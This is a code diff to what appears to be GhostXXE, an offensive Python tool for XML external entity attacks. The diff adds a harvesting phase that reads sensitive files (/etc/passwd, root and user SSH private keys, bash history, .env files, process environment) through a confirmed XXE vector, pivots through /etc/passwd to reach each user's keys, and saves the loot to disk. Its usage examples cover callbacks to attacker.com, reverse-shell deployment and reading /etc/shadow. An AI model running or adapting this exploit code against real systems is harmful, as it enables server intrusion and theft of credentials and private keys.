+            response = self.send_payload(payload, f'Local DTD exploit via {dtd_path}')
+            if response and self._check_xxe_response(response, self.file_path):
+                print(f"{Colors.ERROR}[!] LOCAL DTD XXE CONFIRMED via {dtd_path}{Colors.RESET}")
+                self.vulnerabilities_found.append({
+                    'type': 'XXE via local DTD parameter-entity redefinition',
+                    'severity': 'CRITICAL',
+                    'evidence': f'{self.file_path} disclosed via {dtd_path} ({os_hint})',
+                    'payload': payload,
+                })
+                self.working_read_template = payload.replace(self.file_path, '{FILE}')
+
+        if not present:
+            print(f"{Colors.INFO}[*] No known local DTDs detected{Colors.RESET}")
+        return present
+
+    # ==================================================================
+    # Post-confirmation exploitation: reflection calibration + harvesting
+    # ==================================================================
+
+    HARVEST_FILES_LINUX = [
+        '/etc/passwd', '/etc/hosts', '/etc/hostname', '/etc/issue',
+        '/etc/os-release', '/proc/version', '/proc/self/environ',
+        '/proc/self/cmdline', '/proc/net/tcp', '/etc/ssh/sshd_config',
+        '/root/.ssh/id_rsa', '/root/.bash_history',
+        '/var/www/html/.env', '/var/www/.env', '/etc/mysql/my.cnf',
+        '/etc/nginx/nginx.conf', '/etc/apache2/apache2.conf',
+    ]
+    HARVEST_FILES_WINDOWS = [
+        'C:/Windows/win.ini', 'C:/Windows/System32/drivers/etc/hosts',
+    ]
+
+    def _calibrate_reflection(self) -> bool:
+        """Learn the exact prefix/suffix around reflected entity values so
+        harvested file contents can be carved out of responses cleanly."""
+        marker = 'GHOSTCAL7739'
+        response = self.send_payload(PayloadGenerator.reflection_calibrator(marker),
+                                     'Reflection calibration')
+        if not response or marker not in response.text:
+            return False
+        text = response.text
+        idx = text.find(marker)
+        prefix = text[max(0, idx - 40):idx]
+        suffix = text[idx + len(marker):idx + len(marker) + 40]
+        self.reflection_bounds = (prefix[-20:], suffix[:20])
+        if self.verbose:
+            print(f"{Colors.INFO}[*] Reflection bounds locked: "
+                  f"...{self.reflection_bounds[0]!r} <DATA> {self.reflection_bounds[1]!r}...{Colors.RESET}")
+        return True
+
+    def _carve_reflected(self, text: str) -> Optional[str]:
+        """Extract entity-substituted content using calibrated bounds."""
+        if not self.reflection_bounds:
+            return None
+        prefix, suffix = self.reflection_bounds
+        start = text.find(prefix)
+        if start == -1:
+            return None
+        start += len(prefix)
+        end = text.find(suffix, start) if suffix else -1
+        return text[start:end] if end != -1 else text[start:start + 10000]
+
+    def harvest_files(self):
+        """Systematically loot high-value files through the confirmed XXE
+        vector. Parses /etc/passwd to target real users' SSH keys, tries
+        php://filter for binary-safe reads, and saves everything to disk."""
+        print(f"\n{Colors.HEADER}[*] Phase: File Harvesting via Confirmed XXE{Colors.RESET}")
+
+        calibrated = self._calibrate_reflection()
+        if not calibrated:
+            print(f"{Colors.WARNING}[!] No reflection channel -- harvest via OOB instead (--oob){Colors.RESET}")
+
+        template = self.working_read_template or (
+            '<?xml version="1.0"?>\n'
+            '<!DOCTYPE r [ <!ENTITY x SYSTEM "file://{FILE}"> ]>\n'
+            '<r>&x;</r>')
+
+        targets = list(self.HARVEST_FILES_LINUX) + list(self.HARVEST_FILES_WINDOWS)
+        php_filter = 'php-filter' in self.supported_protocols or (
+            self.parser_fingerprint and 'PHP' in self.parser_fingerprint)
+
+        for file_path in targets:
+            content = self._read_file_via_xxe(file_path, template, use_php_filter=php_filter)
+            if content:
+                self.harvested_loot[file_path] = content
+                preview = content.strip().splitlines()[0][:80] if content.strip() else ''
+                print(f"{Colors.SUCCESS}[+] LOOTED {file_path} ({len(content)} bytes)  {preview}{Colors.RESET}")
+
+                # Pivot: mine /etc/passwd for real home dirs -> SSH keys
+                if file_path == '/etc/passwd':
+                    for extra in self._passwd_pivot_targets(content):
+                        extra_content = self._read_file_via_xxe(extra, template, use_php_filter=php_filter)
+                        if extra_content:
+                            self.harvested_loot[extra] = extra_content
+                            print(f"{Colors.ERROR}[!] LOOTED (pivot) {extra} ({len(extra_content)} bytes){Colors.RESET}")
+
+        if self.harvested_loot:
+            self._save_loot()
+        else:
+            print(f"{Colors.INFO}[*] No files harvested via in-band channel{Colors.RESET}")
+
+    def _read_file_via_xxe(self, file_path: str, template: str, use_php_filter: bool = False) -> Optional[str]:
+        """Attempt one file read: direct entity first, php://filter fallback."""
+        response = self.send_payload(template.replace('{FILE}', file_path),
+                                     f'Harvest: {file_path}')
+        if response:
+            carved = self._carve_reflected(response.text)
+            if carved and carved.strip() and 'GHOSTCAL' not in carved:
+                return carved
+        if use_php_filter:
+            payload = template.replace(
+                'file://{FILE}',
+                f'php://filter/convert.base64-encode/resource={file_path}'
+            ).replace('{FILE}', file_path)
+            response = self.send_payload(payload, f'Harvest (php://filter): {file_path}')
+            if response:
+                carved = self._carve_reflected(response.text)
+                if carved:
+                    blob = re.search(r'[A-Za-z0-9+/=]{16,}', carved)
+                    if blob:
+                        try:
+                            return base64.b64decode(blob.group(0)).decode('utf-8', errors='replace')
+                        except Exception:
+                            pass
+        return None
+
+    @staticmethod
+    def _passwd_pivot_targets(passwd_content: str) -> list:
+        """Derive follow-up loot paths from /etc/passwd home directories."""
+        targets = []
+        for line in passwd_content.splitlines():
+            parts = line.split(':')
+            if len(parts) >= 7 and parts[5].startswith('/home/') and 'sh' in parts[6]:
+                home = parts[5]
+                targets.extend([f'{home}/.ssh/id_rsa', f'{home}/.ssh/authorized_keys',
+                                f'{home}/.bash_history'])
+        return targets[:12]
+
+    def _save_loot(self):
+        """Write harvested files to the loot directory."""
+        host = urlparse(self.target_url).netloc.replace(':', '_')
+        loot_path = os.path.join(self.loot_dir, host)
+        os.makedirs(loot_path, exist_ok=True)
+        for file_path, content in self.harvested_loot.items():
+            safe_name = file_path.replace('\\', '/').strip('/').replace('/', '_').replace(':', '')
+            with open(os.path.join(loot_path, safe_name), 'w') as f:
+                f.write(content)
+        print(f"\n{Colors.SUCCESS}[+] {len(self.harvested_loot)} files saved to {loot_path}/{Colors.RESET}")
+
     def run_scan(self, include_advanced=False):
         """Run complete XXE scan"""
         print(f"\n{Colors.HEADER}[*] Starting GhostXXE Comprehensive Scan{Colors.RESET}")
         print(f"{Colors.INFO}[*] Target: {self.target_url}{Colors.RESET}")
         print(f"{Colors.INFO}[*] Method: {self.method}{Colors.RESET}")
-        
+
+        # Phase 0: Enumeration -- parser, content types, protocols, endpoints
+        try:
+            self.fingerprint_parser()
+            self.enumerate_content_types()
+            self.enumerate_protocol_support()
+            if self.enum_endpoints:
+                self.enumerate_xml_endpoints()
+        except Exception as e:
+            print(f"{Colors.ERROR}[-] Enumeration phase error: {str(e)}{Colors.RESET}")
+            if self.verbose:
+                import traceback
+                traceback.print_exc()
+
         # Phase 1: Test entity injection (confirms XXE)
         entity_vuln = self.detect_xxe_entity_injection()
-        
+
         # If entity injection works, proceed with file read tests
         if entity_vuln:
             print(f"\n{Colors.SUCCESS}[+] XXE CONFIRMED - Proceeding with exploitation tests{Colors.RESET}")
         else:
             print(f"\n{Colors.WARNING}[!] Entity injection not working - trying alternative methods{Colors.RESET}")
-        
+
         # Run basic detection tests
         basic_tests = [
             self.detect_xxe_basic,
@@ -3129,25 +3051,23 @@ Product Version: <xsl:value-of select="system-property('xsl:product-version')" /
             self.detect_xxe_local_dtd,
             self.detect_xinclude,
             self.test_xslt_injection,
-            self.test_xpath_injection
+            self.test_xpath_injection,
+            self.detect_xxe_waf_bypass,
+            self.detect_xxe_encoding_bypass,
         ]
-        
-        # Run advanced tests if requested
-        # Note: Advanced tests are placeholder for future expansion
-        # Current implementation focuses on comprehensive XSLT and XXE testing
-        advanced_tests = [] if include_advanced else []
-        
+
+        # Advanced tests: local DTD enumeration battery + repeat XSLT pass
+        advanced_tests = []
         if include_advanced:
-            print(f"{Colors.INFO}[*] Advanced mode: Running additional XSLT exploitation tests{Colors.RESET}")
-            # Run XSLT tests multiple times with different payloads
-            basic_tests.append(self.test_xslt_injection)
-        
+            print(f"{Colors.INFO}[*] Advanced mode: local DTD enumeration + extended XSLT tests{Colors.RESET}")
+            advanced_tests = [self.enumerate_local_dtds, self.test_xslt_injection]
+
         all_tests = basic_tests + advanced_tests
-        
-        print(f"{Colors.INFO}[*] Running {len(basic_tests)} basic tests{Colors.RESET}")
-        if include_advanced:
-            print(f"{Colors.INFO}[*] Running {len(advanced_tests)} additional advanced tests{Colors.RESET}")
-        
+
+        print(f"{Colors.INFO}[*] Running {len(basic_tests)} detection batteries"
+              + (f" + {len(advanced_tests)} advanced" if advanced_tests else "")
+              + f"{Colors.RESET}")
+
         for test in all_tests:
             try:
                 test()
@@ -3157,7 +3077,17 @@ Product Version: <xsl:value-of select="system-property('xsl:product-version')" /
                 if self.verbose:
                     import traceback
                     traceback.print_exc()
-        
+
+        # Phase 5: File harvesting through whatever vector was confirmed
+        if self.harvest:
+            try:
+                self.harvest_files()
+            except Exception as e:
+                print(f"{Colors.ERROR}[-] Harvest phase error: {str(e)}{Colors.RESET}")
+        elif self.vulnerabilities_found:
+            print(f"\n{Colors.INFO}[*] Tip: rerun with --harvest to loot high-value files "
+                  f"through the confirmed vector{Colors.RESET}")
+
         # Print summary
         self._print_summary()
     
@@ -3380,26 +3310,35 @@ Examples:
   # Vulnerability discovery scan (test if vulnerable)
   python3 ghostxxxe.py -u http://target.com/api -m POST --scan
   
-  # Read specific file
-  python3 ghostxxxe.py -u http://target.com/api -m POST -f connection.php -v
+  # Scan multiple targets from file
+  python3 ghostxxxe.py -l targets.txt -m POST --scan
   
-  # OOB exploitation with callback (custom port)
-  python3 ghostxxxe.py -u http://target.com/api -m POST --oob --callback-ip YOUR_IP --callback-port 9000
+  # Batch scan with multiple threads
+  python3 ghostxxxe.py -l targets.txt -m POST --scan --threads 5
   
-  # CDATA wrapping (advanced file exfiltration, custom port)
-  python3 ghostxxxe.py -u http://target.com/api -m POST --cdata --callback-ip YOUR_IP --callback-port 8888 -f submitDetails.php
+  # Basic XXE exploitation scan
+  python3 ghostxxxe.py -u http://target.com/api -m POST
   
-  # Error-Based XXE (blind exploitation, custom port)
-  python3 ghostxxxe.py -u http://target.com/api -m POST --error-based --callback-ip YOUR_IP --callback-port 7777 -f /etc/hosts
+  # OOB exploitation with callback
+  python3 ghostxxxe.py -u http://target.com/api -m POST --oob --callback http://attacker.com:8080
   
-  # Using full callback URL (port included in URL)
-  python3 ghostxxxe.py -u http://target.com/api -m POST --oob --callback http://your-ip:9999
+  # Test specific file read
+  python3 ghostxxxe.py -u http://target.com/api -m POST -f /etc/shadow
   
   # Interactive shell mode
   python3 ghostxxxe.py -u http://target.com/api -m POST --interactive
   
-  # Full scan with proxy
-  python3 ghostxxxe.py -u http://target.com/api -m POST --advanced --proxy http://127.0.0.1:8080 -v
+  # Deploy reverse shell
+  python3 ghostxxxe.py -u http://target.com/api -m POST --reverse-shell --attacker-ip 10.0.0.1 --attacker-port 4444
+  
+  # Full scan with custom headers and proxy
+  python3 ghostxxxe.py -u http://target.com/api -m POST -H "Authorization: Bearer token" --proxy http://127.0.0.1:8080 -v
+
+  # Advanced scan + loot high-value files through the confirmed vector
+  python3 ghostxxxe.py -u http://target.com/api -m POST --advanced --harvest --loot-dir ./loot
+
+  # Sweep the host for other XML endpoints (SOAP/XML-RPC/SAML/feeds)
+  python3 ghostxxxe.py -u http://target.com/api -m POST --enum-endpoints
 
 👻 Ghost Ops Security - Where Hackers Fear to Tread 👻
         '''
@@ -3426,30 +3365,28 @@ Examples:
     parser.add_argument('--callback', help='Callback URL for OOB (e.g. http://attacker.com)')
     parser.add_argument('--callback-ip', help='Callback IP for OOB server')
     parser.add_argument('--callback-port', type=int, help='Callback port for OOB server (default: 8080)')
-    parser.add_argument('--cdata', action='store_true', 
-                       help='Use CDATA wrapping for advanced file exfiltration (requires callback)')
-    parser.add_argument('--error-based', action='store_true',
-                       help='Use Error-Based XXE for blind exploitation (requires callback)')
     
     # Exploitation modes
     parser.add_argument('--interactive', action='store_true', help='Interactive command execution mode')
     parser.add_argument('--reverse-shell', action='store_true', help='Deploy reverse shell')
     parser.add_argument('--attacker-ip', help='Attacker IP for reverse shell')
     parser.add_argument('--attacker-port', type=int, help='Attacker port for reverse shell')
-    parser.add_argument('--cmd', '--command', dest='command', 
-                       help='Test RCE with expect:// wrapper (e.g., --cmd "id" or --cmd "whoami")')
     
     # Scan options
     parser.add_argument('--scan', action='store_true',
                        help='Run vulnerability discovery scan (tests if endpoint is vulnerable)')
-    parser.add_argument('--advanced', action='store_true', 
-                       help='Run advanced tests (protocols, WAF bypass, DoS, feeds, office docs)')
+    parser.add_argument('--advanced', action='store_true',
+                       help='Run advanced tests (local DTD enumeration, extended XSLT)')
     parser.add_argument('--skip-dos', action='store_true',
                        help='Skip DoS tests (recommended for production)')
-    parser.add_argument('--test-php-filter', action='store_true',
-                       help='Specifically test PHP filter wrapper for source code disclosure')
-    parser.add_argument('--test-expect', action='store_true',
-                       help='Specifically test expect:// wrapper for RCE')
+    parser.add_argument('--harvest', action='store_true',
+                       help='After confirming XXE, loot high-value files (passwd, SSH keys, '
+                            'configs, .env) through the working vector into --loot-dir')
+    parser.add_argument('--enum-endpoints', action='store_true',
+                       help='Sweep the target host for other XML-consuming endpoints '
+                            '(SOAP, XML-RPC, SAML, feeds)')
+    parser.add_argument('--loot-dir', default='./loot',
+                       help='Directory for harvested files (default: ./loot)')
     
     # Output options
     parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
@@ -3592,40 +3529,6 @@ Examples:
             
         elif args.oob:
             scanner.exploit_oob_http()
-        
-        elif args.cdata:
-            # CDATA wrapping exfiltration
-            if not args.callback and not args.callback_ip:
-                print(f"{Colors.ERROR}[-] --callback or --callback-ip required for CDATA exfiltration{Colors.RESET}")
-                return
-            scanner.test_xxe_cdata_exfiltration(args.file)
-        
-        elif args.error_based:
-            # Error-Based XXE exfiltration
-            if not args.callback and not args.callback_ip:
-                print(f"{Colors.ERROR}[-] --callback or --callback-ip required for error-based exfiltration{Colors.RESET}")
-                return
-            scanner.test_xxe_error_based_exfiltration(args.file)
-        
-        elif args.command:
-            # Test RCE with specific command
-            scanner.test_expect_rce(args.command)
-        
-        elif args.test_expect:
-            # Test expect:// wrapper with default commands
-            print(f"{Colors.HEADER}[*] Testing expect:// RCE with multiple commands{Colors.RESET}\n")
-            test_commands = ['id', 'whoami', 'pwd', 'ls']
-            for cmd in test_commands:
-                scanner.test_expect_rce(cmd)
-                time.sleep(1)
-        
-        elif args.test_php_filter:
-            # Test PHP filter wrapper for source code
-            print(f"{Colors.HEADER}[*] Testing PHP Filter Wrapper for Source Code Disclosure{Colors.RESET}\n")
-            test_files = ['index.php', 'config.php', 'database.php', 'connection.php']
-            for file in test_files:
-                scanner.test_php_filter_source_read(file)
-                time.sleep(1)
             
         else:
             # Run full scan
